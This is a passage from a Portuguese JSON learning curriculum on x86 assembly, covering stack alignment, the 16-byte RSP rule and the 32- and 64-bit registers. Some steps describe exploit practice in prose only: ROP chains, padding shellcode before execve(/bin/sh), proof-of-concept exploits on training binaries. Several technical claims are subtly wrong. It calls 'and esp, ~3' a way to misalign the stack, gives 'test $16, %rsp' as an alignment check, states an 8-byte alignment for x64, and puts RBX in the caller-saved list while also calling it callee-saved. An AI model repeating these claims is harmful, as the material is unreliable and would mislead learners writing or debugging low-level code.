                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "GDB debugger",
                                    "Linux x86-32 environment ou VM"
                                  ],
                                  "tips": "No GDB, use 'info registers esp' e 'print $esp & 3' para verificação rápida.",
                                  "learningObjective": "Saber como inspecionar e verificar programaticamente o alinhamento do ESP.",
                                  "commonMistakes": [
                                    "Esquecer de alinhar no linker script",
                                    "Usar registradores errados como EBP em vez de ESP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Penalidades de Performance por Desalinhamento",
                                  "subSteps": [
                                    "Estude como CPUs x86-32 lidam com acessos desalinhados: split em dois cycles ou fault em alguns modos.",
                                    "Meça performance com código alinhado vs. desalinhado usando loops de memcpy ou array access.",
                                    "Use ferramentas como perf ou cycle counters (rdtsc) para quantificar slowdown.",
                                    "Compare em diferentes CPUs (Pentium vs. modernas) para ver evoluções.",
                                    "Simule em user-mode vs. kernel-mode onde faults são mais caros."
                                  ],
                                  "verification": "Registre tempos de execução: desalinhado deve ser 20-50% mais lento em loops de memória.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "rdtsc assembly intrinsics",
                                    "perf tool no Linux",
                                    "Benchmark code samples from Agner Fog's guides"
                                  ],
                                  "tips": "Force desalinhamento com 'and esp, ~3' mas cuidado com crashes; use em buffers controlados.",
                                  "learningObjective": "Quantificar e compreender impactos de performance de acessos de memória desalinhados.",
                                  "commonMistakes": [
                                    "Testar só em CPUs modernas que toleram desalinhamento",
                                    "Ignorar cache effects que mascaram penalidades"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Detecção e Correção de Desalinhamento em Cenários Reais",
                                  "subSteps": [
                                    "Analise um binário vulnerável com ROP chains onde desalinhamento quebra gadgets.",
                                    "Debugue um exploit que falha por pilha desalinhada e corrija com 'sub esp, 4' pads.",
                                    "Escreva um checker assembly que valida alinhamento antes de retornos.",
                                    "Teste em cenários de buffer overflow simulados.",
                                    "Documente findings em um relatório com screenshots de GDB."
                                  ],
                                  "verification": "Demonstre um exploit falhando por desalinhamento e succeeding após correção.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "GDB, pwndbg plugin",
                                    "Sample vulnerable binaries from exploit-exercises",
                                    "ROPgadget tool"
                                  ],
                                  "tips": "Use 'checksec' para ver se binário é PIC (position independent, afeta alinhamento).",
                                  "learningObjective": "Aplicar verificação de alinhamento em contextos de análise de binários e segurança.",
                                  "commonMistakes": [
                                    "Assumir alinhamento sempre mantido pelo OS",
                                    "Não considerar calling conventions como stdcall"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um buffer overflow exploit x86-32, verifique ESP com 'p $esp & 0x3' no GDB; se !=0, adicione 'sub esp, 4' no shellcode para realinhar antes de execve(/bin/sh). Isso previne segfaults em gadgets desalinhados.",
                              "finalVerifications": [
                                "ESP & 3 == 0 antes de qualquer pop/ret.",
                                "Acesso a [esp+offset] não causa alignment fault.",
                                "Benchmark mostra <10% slowdown em loops alinhados.",
                                "Exploit ROP succeeds apenas com pilha alinhada.",
                                "Explicar verbalmente penalidade: 2-5 cycles extra por access desalinhado.",
                                "Identificar desalinhamento em trace de GDB de binário real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na verificação: ESP % 4 == 0 detectado corretamente.",
                                "Compreensão de performance: Explicar e medir penalidades >20%.",
                                "Código funcional: Assembly checker compila e roda sem erros.",
                                "Análise de cenários: Identificar 3 causas comuns de desalinhamento.",
                                "Aplicação prática: Corrigir desalinhamento em exploit simulado.",
                                "Relatório claro: Diagramas e evidências de GDB screenshots."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de pilha pelo kernel e signal handlers.",
                                "Otimização de Performance: Técnicas de alinhamento em compiladores (gcc -malign-stack).",
                                "Segurança Computacional: Mitigações como stack canaries sensíveis a alinhamento.",
                                "Arquitetura de Computadores: Cache lines e alinhamento em níveis L1/L2."
                              ],
                              "realWorldApplication": "Em reverse engineering de malwares ou CTFs, verificar alinhamento da pilha previne falhas em shellcodes; em desenvolvimento de software embarcado x86-32, garante performance em RTOS sem faults de memória."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.3.2",
                            "name": "Aplicar alinhamento de 16 bytes em 64 bits",
                            "description": "Explicar requisito de alinhamento de 16 bytes para RSP em System V ABI (Linux x86-64) antes de chamadas como CALL, usando AND RSP para ajuste.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o requisito de alinhamento de 16 bytes para RSP em System V ABI",
                                  "subSteps": [
                                    "Ler a seção relevante da documentação System V ABI para x86-64 sobre convenções de pilha",
                                    "Identificar que o registrador RSP deve ser alinhado a 16 bytes (múltiplo de 16) imediatamente antes de qualquer instrução CALL",
                                    "Explicar o motivo: otimização para instruções SIMD (SSE/AVX) que requerem alinhamento",
                                    "Analisar o impacto de instruções como PUSH (8 bytes), que desalinharam RSP de 0 para 8 mod 16",
                                    "Estudar exceções, como a 'red zone' de 128 bytes não usada em chamadas"
                                  ],
                                  "verification": "Escrever um resumo de 3-5 frases explicando o requisito e testar com quiz simples",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação System V ABI PDF",
                                    "Referência Intel x86-64 Manuals (Vol. 1)",
                                    "Vídeo tutorial sobre ABI x86-64"
                                  ],
                                  "tips": "Lembre-se: alinhamento é medido em bytes, não palavras; 16 bytes = 2 quadwords",
                                  "learningObjective": "Dominar os motivos e regras exatas do alinhamento de pilha em Linux x86-64",
                                  "commonMistakes": [
                                    "Confundir com alinhamento de 8 bytes em x86-32",
                                    "Ignorar que CALL empilha 8 bytes (RIP)",
                                    "Esquecer da red zone em funções leaf"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Verificar o alinhamento atual de RSP em código assembly",
                                  "subSteps": [
                                    "Escrever um snippet assembly simples que imprime RSP atual usando printf",
                                    "Usar GDB para inspecionar: 'info registers rsp' ou 'p/x $rsp & 0xf'",
                                    "Simular desalinhamento com PUSH de registrador",
                                    "Comparar RSP % 16 antes e após PUSH/CALL",
                                    "Criar macro ou função para teste de alinhamento: test $16, %rsp"
                                  ],
                                  "verification": "Executar código em GDB e confirmar se RSP & 0xF == 0",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "NASM ou GAS assembler",
                                    "GDB debugger",
                                    "GCC para linkar com libc",
                                    "Exemplo de código: hello world em asm"
                                  ],
                                  "tips": "Use 'x/10gx $rsp' no GDB para visualizar pilha alinhada",
                                  "learningObjective": "Saber diagnosticar desalinhamento da pilha em runtime",
                                  "commonMistakes": [
                                    "Não pausar em breakpoint antes de CALL",
                                    "Confundir RSP com RBP",
                                    "Usar printf sem alinhar, causando SIGSEGV"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar o ajuste de RSP usando instrução AND",
                                  "subSteps": [
                                    "Calcular a máscara de alinhamento: 0xFFFFFFFFFFFFFFF0 (todos bits menos os 4 baixos)",
                                    "Inserir 'and $0xFFFFFFFFFFFFFFF0, %rsp' antes da CALL",
                                    "Testar em função com PUSHes prévios para forçar desalinhamento",
                                    "Verificar que AND arredonda RSP para baixo ao múltiplo de 16 sem perda de dados importantes",
                                    "Adicionar SUB RSP, 8 após AND se necessário para reservar espaço"
                                  ],
                                  "verification": "Executar e checar RSP no GDB: deve ser 0 mod 16 após AND",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de texto (VSCode com extensão asm)",
                                    "NASM/GAS",
                                    "GDB",
                                    "Makefile para assemble/link"
                                  ],
                                  "tips": "AND é idempotente: aplicar múltiplas vezes não muda",
                                  "learningObjective": "Executar ajuste preciso de pilha com operações bitwise eficientes",
                                  "commonMistakes": [
                                    "Usar máscara errada (ex: 0xFFFFFFF8 para 8 bytes)",
                                    "Esquecer de preservar valor original se necessário",
                                    "Aplicar AND após CALL"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar alinhamento em uma função completa e testar chamadas",
                                  "subSteps": [
                                    "Criar função assembly que faz PUSHes, alinha RSP e chama printf",
                                    "Compilar, linkar com C runtime e executar",
                                    "Usar objdump ou GDB para disassemble e validar instruções",
                                    "Testar cenários: função com args variados, recursão simples",
                                    "Adicionar verificação pós-CALL: RSP deve restaurar alinhamento"
                                  ],
                                  "verification": "Programa roda sem SIGSEGV e RSP alinhado em todos CALLs via GDB",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Exemplo código completo",
                                    "objdump",
                                    "strace para rastrear syscalls"
                                  ],
                                  "tips": "Salve RSP em variável local se precisar restaurar exatamente",
                                  "learningObjective": "Aplicar alinhamento em código real, garantindo conformidade ABI",
                                  "commonMistakes": [
                                    "Não alinhar após múltiplos PUSH/POP",
                                    "Sobrescrever red zone inadvertidamente",
                                    "Linkar sem -m64"
                                  ]
                                }
                              ],
                              "practicalExample": "Em assembly x86-64 NASM:\nsection .text\nglobal _start\n_start:\n  push rbp\n  mov rdi, msg\n  ; Desalinhado agora (RSP %16 ==8)\n  and rsp, 0xFFFFFFFFFFFFFFF0  ; Alinha a 16\n  call printf\n  ; ... resto do código\nmsg: db 'Hello, aligned stack!',10,0",
                              "finalVerifications": [
                                "RSP & 0xF == 0 imediatamente antes de toda instrução CALL",
                                "Programa executa sem SIGSEGV ou misaligned access errors",
                                "GDB confirma alinhamento em breakpoints pré-CALL",
                                "Desassembly mostra AND correto antes de CALL",
                                "Função retorna com RSP restaurado ao alinhamento original",
                                "Teste com valgrind mostra no stack corruption"
                              ],
                              "assessmentCriteria": [
                                "Código inclui AND com máscara exata 0x...FFF0",
                                "Ajuste ocorre só quando necessário (test rsp,16)",
                                "Nenhum registrador extra corrompido pelo ajuste",
                                "Integração perfeita com chamadas libc (printf)",
                                "Explicação correta do porquê do alinhamento",
                                "Testes cobrem cenários desalinhados"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações bitwise (AND, máscaras de bits, aritmética modular)",
                                "Sistemas Operacionais: Convenções ABI, gerenciamento de pilha e contexto de processo",
                                "Segurança Computacional: Prevenção de exploits via stack canary e alinhamento",
                                "Programação em C: Interoperabilidade FFI com assembly alinhado",
                                "Arquitetura de Computadores: Otimizações SIMD/AVX dependentes de alinhamento"
                              ],
                              "realWorldApplication": "Desenvolvimento de bibliotecas assembly customizadas, Foreign Function Interface (FFI) em linguagens como Rust/Python, reverse engineering de binários malware (onde desalinhamento causa crashes em exploits), otimizações de performance em kernels Linux e compiladores GCC/Clang."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.3.3",
                            "name": "Analisar impactos em engenharia reversa",
                            "description": "Identificar desalinhamentos em binários desmontados para detectar vulnerabilidades como stack misalignment em ROP chains.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e desmontar binário alvo",
                                  "subSteps": [
                                    "Instale ferramentas como Ghidra, IDA Pro Free ou objdump para desmontagem.",
                                    "Carregue um binário vulnerável de exemplo (ex: buffer overflow com ROP possível).",
                                    "Gere o listing de assembly 32/64 bits focando em funções de manipulação de pilha.",
                                    "Identifique convenções de chamada (cdecl, stdcall) e alinhamentos esperados (8 bytes em x64).",
                                    "Anote endereços de pilha e registradores relevantes (RSP/RBP em x64, ESP/EBP em x32)."
                                  ],
                                  "verification": "Listing de assembly gerado com seções de pilha visíveis e sem erros de parsing.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ghidra/IDA Pro, binário de teste (ex: de DVWA ou exploit-db), debugger como GDB.",
                                  "tips": "Use scripts de automação em Ghidra para destacar pushes/pops na pilha.",
                                  "learningObjective": "Configurar ferramentas para visualização precisa de código assembly e estruturas de pilha.",
                                  "commonMistakes": "Ignorar arquitetura (32 vs 64 bits), levando a desalinhamentos errôneos; não verificar endianness."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar pontos de alinhamento de pilha no código desmontado",
                                  "subSteps": [
                                    "Localize instruções de prologue/epilogue de funções (push ebp; mov ebp, esp).",
                                    "Marque acessos à pilha (mov [esp+offset], reg) e verifique múltiplos de 4/8 bytes.",
                                    "Simule execução passo a passo com debugger para observar RSP/ESP em breakpoints.",
                                    "Registre desalinhamentos potenciais em overflows ou ret2libc cenários.",
                                    "Compare com ABI padrão (System V para Linux x64: RSP % 16 == 0 antes de call)."
                                  ],
                                  "verification": "Mapa anotado de alinhamentos com offsets corretos e simulação sem crashes.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "GDB ou WinDbg, binário desmontado, documentação ABI (x86-64 psABI).",
                                  "tips": "Use 'info registers rsp' no GDB após cada push para rastrear alinhamento dinamicamente.",
                                  "learningObjective": "Reconhecer padrões de alinhamento de pilha em assembly e detectá-los em binários reais.",
                                  "commonMistakes": "Confundir alinhamento de memória com pilha; ignorar shadow space em x64 Windows."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar impactos de desalinhamentos em binários desmontados",
                                  "subSteps": [
                                    "Injete payload com desalinhamento intencional (ex: buffer +1 byte para quebrar 8-byte align).",
                                    "Observe crashes ou comportamentos anômalos em gadgets ROP (pop reg; ret).",
                                    "Trace controle de fluxo: verifique se ROP chain falha devido a misaligned pointers.",
                                    "Quantifique impactos: segfaults, leaks de info ou bypass de mitigações (ASLR/Canaries).",
                                    "Documente chain de causas: desalinhamento -> bad gadget -> exploit fail/success."
                                  ],
                                  "verification": "Relatório de análise mostrando pelo menos 2 impactos específicos (ex: ROP chain quebrado).",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Exploit framework como ROPgadget, Python para payloads, core dumps do GDB.",
                                  "tips": "Gere ROP chains com ROPgadget e teste variações de padding para alinhamento.",
                                  "learningObjective": "Avaliar consequências de desalinhamentos na execução e exploits de pilha.",
                                  "commonMistakes": "Não considerar mitigações modernas como NX/DEP; assumir alinhamento sempre 4 bytes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detectar e validar vulnerabilidades como stack misalignment em ROP chains",
                                  "subSteps": [
                                    "Scan binário por gadgets sensíveis a alinhamento usando rp++ ou ROPgadget.",
                                    "Construa PoC exploit com desalinhamento e valide em ambiente controlado.",
                                    "Compare execuções alinhadas vs desalinhadas para isolar vulnerabilidade.",
                                    "Proponha mitigações: alinhamento forçado via compiler flags (-mstackrealign).",
                                    "Gere relatório final com evidências (screenshots de GDB, ROP chains)."
                                  ],
                                  "verification": "PoC funcional demonstrando detecção de misalignment em ROP, com relatório completo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "ROPgadget tool, ambiente VM para testes, relatórios em Markdown.",
                                  "tips": "Teste em múltiplas arquiteturas (x86/x64) para generalizar achados.",
                                  "learningObjective": "Integrar análise para identificar e provar vulnerabilidades de desalinhamento em cenários ROP.",
                                  "commonMistakes": "Overfitting PoC a um binário; não validar em release builds com otimizações."
                                }
                              ],
                              "practicalExample": "Em um binário CTF vulnerável (ex: buffer overflow em 'vuln.c' compilado sem stack protector), desmonte com Ghidra, identifique desalinhamento RSP%16!=0 antes de 'call', injete ROP chain com pop rdi; ret – o misalignment causa segfault em gadget seguinte, permitindo detecção e craft de payload corrigido (+0x8 padding).",
                              "finalVerifications": [
                                "Identificou todos os pontos de desalinhamento na pilha do binário.",
                                "Simulou ROP chain com sucesso/falha devido a misalignment.",
                                "Documentou impactos em pelo menos 2 cenários (crash, leak).",
                                "Validou com debugger em execução real.",
                                "Propôs mitigações viáveis.",
                                "Relatório inclui screenshots e PoC código."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de alinhamentos ABI (90%+ acurácia).",
                                "Profundidade da análise de impactos (múltiplos vetores cobertos).",
                                "Qualidade do PoC exploit (reprodutível e comentado).",
                                "Completude do relatório (todos elementos visuais e técnicos).",
                                "Criatividade em conexões com ROP/exploits reais.",
                                "Tempo de execução dentro do estimado (±20%)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender stack frames e otimizações de compilador.",
                                "Criptografia: Detectar side-channels em desalinhamentos (timing attacks).",
                                "Redes/Segurança: Aplicar em análise de payloads em exploits remotos (ex: HTTP buffers).",
                                "Engenharia de Software: Mitigações via flags de linker (PIE, RELRO)."
                              ],
                              "realWorldApplication": "Em pentests e análise de malware, detectar stack misalignment em binários desmontados previne ROP exploits em wild (ex: análise de ransomware como WannaCry, onde chains falham por desalinhamento, permitindo detecção precoce e patching de software legado)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.5",
                    "name": "Diferenças entre Assembly 32 e 64 bits",
                    "description": "Principais diferenças em registradores, tamanho de ponteiros, chamadas de convenção e extensões RIP-relative.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.5.1",
                        "name": "Diferenças nos Registradores",
                        "description": "Comparação entre os registradores disponíveis em Assembly x86 (32 bits) e x86-64 (64 bits), incluindo aumento no número de registradores gerais e extensões de tamanho.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.5.1.1",
                            "name": "Identificar registradores em 32 bits",
                            "description": "Listar e descrever os registradores principais em x86 32 bits, como EAX, EBX, ECX, EDX, ESI, EDI, EBP e ESP, e suas funções básicas em operações aritméticas e controle de pilha.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Visão Geral dos Registradores em x86 32 bits",
                                  "subSteps": [
                                    "Estude a arquitetura x86 32 bits e o conceito de registradores como armazenamento rápido de dados.",
                                    "Identifique os 8 registradores principais: EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP.",
                                    "Memorize as abreviações e categorize-os em registradores de propósito geral e de ponteiro/índice.",
                                    "Compare brevemente com registradores de 16/8 bits (AX, AH, etc.), mas foque em 32 bits.",
                                    "Crie um diagrama mental ou tabela resumindo nomes e tamanhos (todos 32 bits)."
                                  ],
                                  "verification": "Crie uma tabela listando os 8 registradores com suas categorias; verifique se está completa e correta consultando documentação oficial.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 (manual de desenvolvedor), editor de texto para tabela"
                                  ],
                                  "tips": "Use mnemônicos: 'A B C D' para propósito geral, 'SI DI BP SP' para ponteiros.",
                                  "learningObjective": "Compreender a estrutura e categorização básica dos registradores x86 32 bits.",
                                  "commonMistakes": [
                                    "Confundir com registradores 64 bits (RAX etc.), ignorar ESP como ponteiro de pilha."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Registradores de Propósito Geral: EAX, EBX, ECX, EDX",
                                  "subSteps": [
                                    "Aprenda funções: EAX (acumulador para aritmética, retornos de funções), EBX (base para endereços), ECX (contador de loops), EDX (dados I/O, multiplicação/divisão).",
                                    "Estude usos em operações aritméticas: ADD/SUB com EAX, MUL/DIV com EDX:EAX.",
                                    "Pratique escrevendo instruções simples como 'mov eax, 10; add ebx, eax'.",
                                    "Identifique convenções de chamada (EAX para retorno, ECX para parâmetros).",
                                    "Anote exemplos de código para cada um."
                                  ],
                                  "verification": "Escreva 4 instruções assembly, uma para cada registrador, e explique seu uso; valide com um assembler online.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Assembler online como Godbolt.org, notepad para códigos"
                                  ],
                                  "tips": "Lembre: EAX é o 'trabalhador principal' para resultados aritméticos.",
                                  "learningObjective": "Descrever funções específicas e usos aritméticos dos registradores de propósito geral.",
                                  "commonMistakes": [
                                    "Confundir ECX com contador de pilha, esquecer EDX em operações de 64 bits implícitas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Registradores de Ponteiro e Índice: ESI, EDI, EBP, ESP",
                                  "subSteps": [
                                    "Estude ESI (Source Index para strings), EDI (Destination Index para strings), EBP (Base Pointer para frames de pilha), ESP (Stack Pointer para topo da pilha).",
                                    "Aprenda controle de pilha: PUSH diminui ESP, POP aumenta ESP; EBP para acesso local.",
                                    "Pratique com instruções: MOV ESI, addr; PUSH EAX; MOV EBP, ESP.",
                                    "Entenda diferenças: ESP muda dinamicamente, EBP é fixo por função.",
                                    "Crie fluxograma de PUSH/POP afetando ESP."
                                  ],
                                  "verification": "Simule uma pilha com PUSH/POP em papel, rastreando ESP e EBP; confira com debugger.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Debugger x32dbg ou OllyDbg, papel para simulação"
                                  ],
                                  "tips": "Visualize ESP como 'dedo apontando topo da pilha'; EBP como 'âncora da função atual'.",
                                  "learningObjective": "Explicar funções de ponteiro/índice e seu papel no controle de pilha.",
                                  "commonMistakes": [
                                    "Confundir ESI/EDI com ponteiros de pilha, ignorar alinhamento de ESP."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Prática de Identificação e Aplicação Integrada",
                                  "subSteps": [
                                    "Analise snippets de assembly reais, identificando todos os registradores e suas funções.",
                                    "Escreva um programa simples usando todos os 8 registradores (loop com ECX, aritmética em EAX, pilha com ESP).",
                                    "Use um debugger para observar valores em EAX, ESP etc. durante execução.",
                                    "Responda perguntas: 'Qual registrador para loop? Para pilha?'.",
                                    "Crie quiz pessoal com 10 perguntas sobre identificação."
                                  ],
                                  "verification": "Execute código em debugger e capture screenshot mostrando registradores corretos; autoavalie.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "x32dbg ou NASM + linker, snippets de código assembly"
                                  ],
                                  "tips": "Comece com código mínimo; pause debugger em breakpoints para inspecionar.",
                                  "learningObjective": "Identificar e aplicar todos os registradores em contextos reais de assembly.",
                                  "commonMistakes": [
                                    "Não observar mudanças dinâmicas em ESP, confundir funções em código complexo."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um código de soma de array: mov ecx, 10  ; contador de loop\nmov esi, array_start  ; índice fonte\nxor eax, eax  ; acumulador zero\nloop: add eax, [esi]  ; soma usando EAX e ESI\nadd esi, 4\nloop loop\n; Aqui, EAX tem o resultado, ESP gerencia pilha de chamadas.",
                              "finalVerifications": [
                                "Liste os 8 registradores x86 32 bits sem erros.",
                                "Descreva função principal de EAX, ECX, ESP e EBP.",
                                "Explique como PUSH/POP afetam ESP.",
                                "Identifique registradores em um snippet de 10 linhas de assembly.",
                                "Diferencie usos aritméticos vs. controle de pilha.",
                                "Simule execução de loop simples rastreando ECX e EAX."
                              ],
                              "assessmentCriteria": [
                                "Precisão na nomenclatura e categorização (100% correto).",
                                "Correção das funções básicas e exemplos contextualizados.",
                                "Profundidade em substeps e verificações práticas.",
                                "Capacidade de aplicação em código real via debugger.",
                                "Identificação de erros comuns e avoidance demonstrado.",
                                "Integração de aritmética e pilha em exemplos."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entender pipeline e cache impactados por registradores.",
                                "Programação em C: Registradores implícitos em compilação (volatile qualifiers).",
                                "Segurança Computacional: Exploração de stack via ESP/EBP em buffer overflows.",
                                "Análise de Binários: Identificação em desassembly para reverse engineering.",
                                "Algoritmos: Otimização de loops usando ECX/ESI."
                              ],
                              "realWorldApplication": "Na análise de malware ou reverse engineering, identificar registradores em 32 bits permite rastrear fluxos de dados, manipulações de pilha para exploits (ex: stack pivoting) e depuração de binários legados em ferramentas como IDA Pro ou Ghidra."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.1.2",
                            "name": "Identificar registradores em 64 bits",
                            "description": "Listar e descrever os registradores em x86-64, incluindo RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP, R8-R15, destacando o aumento de 8 para 16 registradores de propósito geral.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Evolução dos Registradores de 32 para 64 bits",
                                  "subSteps": [
                                    "Revise os 8 registradores de propósito geral (GPRs) em x86-32: EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP.",
                                    "Entenda que em x86-64, esses são estendidos para 64 bits com prefixo 'R' (RAX, etc.), mantendo compatibilidade.",
                                    "Note o aumento para 16 GPRs totais com a adição de R8 a R15.",
                                    "Identifique o impacto: mais registradores reduzem pressão na memória e melhoram performance.",
                                    "Compare tamanhos: 32 bits vs 64 bits para endereços e dados."
                                  ],
                                  "verification": "Crie uma tabela comparativa com 8 registradores de 32 bits e seus equivalentes de 64 bits, confirmando o total de 16.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 manuals (PDF ou online)",
                                    "Folha de papel ou editor de texto para tabela"
                                  ],
                                  "tips": "Use mnemônicos: os primeiros 8 são extensões diretas dos de 32 bits; os novos R8-R15 são 'extras'.",
                                  "learningObjective": "Entender a transição e o motivo do aumento de registradores para otimizar código.",
                                  "commonMistakes": [
                                    "Confundir EAX com RAX sem notar a extensão de bits",
                                    "Esquecer que ESP vira RSP e EBP vira RBP"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Memorizar os 8 Registradores Herdados em 64 bits",
                                  "subSteps": [
                                    "Liste: RAX (acumulador), RBX (base), RCX (contador), RDX (dados/extensão de dados).",
                                    "Liste: RSI (source index), RDI (destination index), RBP (base pointer), RSP (stack pointer).",
                                    "Associe funções comuns: RAX para resultados, RCX para loops, RSP para pilha.",
                                    "Pratique escrevendo os nomes 3 vezes cada, com abreviações de 64, 32, 16 e 8 bits (ex: RAX/EAX/AX/AL).",
                                    "Desenhe um diagrama mostrando hierarquia de tamanhos."
                                  ],
                                  "verification": "Recite oralmente ou escreva os 8 registradores com uma função breve para cada.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Flashcards (app como Anki ou papel)",
                                    "Diagrama de registradores x86-64"
                                  ],
                                  "tips": "Lembre-se: 'A B C D' para RAX-RDX; 'SI DI BP SP' para os índices e ponteiros.",
                                  "learningObjective": "Dominar nomes e papéis dos registradores legados em x86-64.",
                                  "commonMistakes": [
                                    "Trocar RSI e RDI",
                                    "Confundir RBX com RCX"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aprender os Novos Registradores R8 a R15",
                                  "subSteps": [
                                    "Liste sequencialmente: R8, R9, R10, R11, R12, R13, R14, R15.",
                                    "Note convenções de chamada (System V ABI): RDI, RSI, RDX, RCX, R8, R9 para primeiros 6 argumentos.",
                                    "R10-R11 para uso temporário, R12-R15 como callee-saved (preservados por funções).",
                                    "Pratique associando: R8-R9 para args extras, R15 como último.",
                                    "Crie uma lista numerada com exemplos de uso hipotético."
                                  ],
                                  "verification": "Escreva os 8 novos registradores em ordem e indique pelo menos 2 convenções de uso.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Tabela ABI System V (online)",
                                    "Editor de texto para listas"
                                  ],
                                  "tips": "Pense em R8-R15 como 'reserva': R8/R9 para args, outros para preservação.",
                                  "learningObjective": "Identificar e diferenciar os novos registradores de 64 bits.",
                                  "commonMistakes": [
                                    "Esquecer a ordem R8 a R15",
                                    "Confundir caller vs callee-saved"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação em Código Assembly",
                                  "subSteps": [
                                    "Abra um exemplo de código x86-64 em um disassembler ou editor.",
                                    "Identifique todos os registradores usados, categorizando herdados vs novos.",
                                    "Trace o uso: qual registrador armazena quê (ex: args em RDI, retorno em RAX).",
                                    "Modifique o código trocando registradores e observe impactos.",
                                    "Repita com 3 snippets diferentes."
                                  ],
                                  "verification": "Analise um código fornecido e liste todos os 16 registradores possíveis, marcando os usados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta como objdump, GDB ou site online como godbolt.org",
                                    "Exemplos de assembly x86-64"
                                  ],
                                  "tips": "Use 'r' prefixo para 64 bits; foque em mov/add instruções primeiro.",
                                  "learningObjective": "Aplicar conhecimento para identificar registradores em código real.",
                                  "commonMistakes": [
                                    "Ignorar registradores parciais como EAX em contexto 64 bits",
                                    "Não notar RSP em pushes/pops"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Consolidar Conhecimento com Exercícios de Verificação",
                                  "subSteps": [
                                    "Crie um quiz: liste 16 GPRs sem olhar notas.",
                                    "Explique diferenças chave vs x86-32 em um parágrafo.",
                                    "Simule uma função: defina args em RDI-R9, retorno em RAX.",
                                    "Discuta vantagens dos 16 GPRs em loops ou funções complexas.",
                                    "Revise erros comuns de steps anteriores."
                                  ],
                                  "verification": "Responda a 10 perguntas sobre registradores com 100% acerto.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Quiz auto-gerado ou online (ex: Quizlet)",
                                    "Notas dos steps anteriores"
                                  ],
                                  "tips": "Teste-se em ordem aleatória para reforçar memória.",
                                  "learningObjective": "Verificar domínio completo dos registradores x86-64.",
                                  "commonMistakes": [
                                    "Subestimar RBP/RSP em frames de pilha",
                                    "Esquecer R15 existe"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário de malware disassemblado: 'mov rdi, [rax+8]; mov r10, rdx; call func', identifique RDI (arg1), RAX (fonte), R10 (temporário), RDX (arg anterior), destacando uso de novos (R10) e herdados.",
                              "finalVerifications": [
                                "Listar corretamente os 16 GPRs x86-64: RAX a RDX, RSI/RDI/RBP/RSP, R8-R15.",
                                "Explicar o aumento de 8 para 16 e impacto na performance.",
                                "Identificar registradores em um snippet de assembly de 20 linhas.",
                                "Diferenciar caller-saved (RAX-RCX, RDX, R8-R10) vs callee-saved (RBX, RBP, R12-R15).",
                                "Associar funções padrão: RAX=retorno, RSP=pilha, RDI/RSI=strings.",
